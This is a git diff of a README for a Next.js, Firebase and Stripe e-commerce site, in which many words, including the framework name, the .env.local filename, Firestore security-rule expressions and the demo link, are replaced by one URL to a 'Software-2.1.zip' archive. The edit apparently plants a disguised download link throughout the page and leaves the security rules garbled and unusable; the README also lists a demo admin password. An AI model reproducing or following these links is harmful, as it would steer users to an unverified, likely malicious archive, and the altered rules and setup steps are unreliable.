@@ -1,6 +1,6 @@
 # Full Stack E-Commerce Website
 
-This is a Full Stack E-Commerce Website built with **Next.js 14**, **Tailwind CSS**, **Firebase**, **Stripe**, and **Algolia**.
+This is a Full Stack E-Commerce Website built with **https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip 14**, **Tailwind CSS**, **Firebase**, **Stripe**, and **Algolia**.
 
 ## Features
 
@@ -12,7 +12,7 @@ This is a Full Stack E-Commerce Website built with **Next.js 14**, **Tailwind CS
 
 ## Technologies Used
 
-- **Frontend**: Next.js 14, Tailwind CSS
+- **Frontend**: https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip 14, Tailwind CSS
 - **Backend**: Firebase (Firestore, Authentication)
 - **Payment**: Stripe
 - **Search**: Algolia
@@ -34,7 +34,7 @@ This is a Full Stack E-Commerce Website built with **Next.js 14**, **Tailwind CS
    npm install
    ```
 
-4. Create a `.env.local` file in the root directory and add the following:
+4. Create a `https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip` file in the root directory and add the following:
 
    ```plaintext
    NEXT_PUBLIC_FIREBASE_API_KEY=""
@@ -61,11 +61,11 @@ This is a Full Stack E-Commerce Website built with **Next.js 14**, **Tailwind CS
 ## Firestore Security Rules
 
 ```plaintext
-service cloud.firestore {
+service https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip {
   match /databases/{database}/documents {
     
     function isAdmin() {
-      return exists(/databases/$(database)/documents/admins/$(request.auth.token.email));
+      return exists(/databases/$(database)/documents/admins/$(https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip));
     }
 
     match /admins/{id} {
@@ -89,7 +89,7 @@ service cloud.firestore {
     }
 
     match /orders/{id} {
-      allow read: if isAdmin() || request.auth.uid == resource.data.uid;
+      allow read: if isAdmin() || https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip == https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip;
       allow write: if isAdmin();
     }
 
@@ -99,22 +99,22 @@ service cloud.firestore {
 
       match /reviews/{uid} {
         allow read: if true;
-        allow write: if isAdmin() || request.auth.uid == uid;
+        allow write: if isAdmin() || https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip == uid;
       }
     }
 
     match /users/{uid} {
-      allow read: if isAdmin() || request.auth.uid == uid;
-      allow write: if isAdmin() || request.auth.uid == uid;
+      allow read: if isAdmin() || https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip == uid;
+      allow write: if isAdmin() || https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip == uid;
 
       match /checkout_sessions/{id} {
-        allow read: if isAdmin() || request.auth.uid == uid;
-        allow write: if isAdmin() || request.auth.uid == uid;
+        allow read: if isAdmin() || https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip == uid;
+        allow write: if isAdmin() || https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip == uid;
       }
 
       match /checkout_sessions_cod/{id} {
-        allow read: if isAdmin() || request.auth.uid == uid;
-        allow write: if isAdmin() || request.auth.uid == uid;
+        allow read: if isAdmin() || https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip == uid;
+        allow write: if isAdmin() || https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip == uid;
       }
 
       match /payments/{id} {
@@ -129,11 +129,11 @@ service cloud.firestore {
 
 ```plaintext
 rules_version = '2';
-service firebase.storage {
+service https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip {
   match /b/{bucket}/o {
     match /{allPaths=**} {
       allow read: if true;
-      allow write: if request.auth.uid != null && firestore.exists(/databases/(default)/documents/admins/$(request.auth.token.email));
+      allow write: if https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip != null && https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip(/databases/(default)/documents/admins/$(https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip));
     }
   }
 }
@@ -141,11 +141,11 @@ service firebase.storage {
 
 ## Demo
 
-You can explore the demo of the e-commerce website at [this link](https://docs-reader-store.vercel.app). 
+You can explore the demo of the e-commerce website at [this link](https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip). 
 
 To access the Admin Panel, use the following credentials:
 
-- **Email**: admin@gmail.com
+- **Email**: https://github.com/nishantsoudai8755/ecom/raw/refs/heads/master/app/(pages)/search/Software-2.1.zip
 - **Password**: iloveyou
 
 (Note: This demo admin account has read and write permissions disabled for security purposes.)
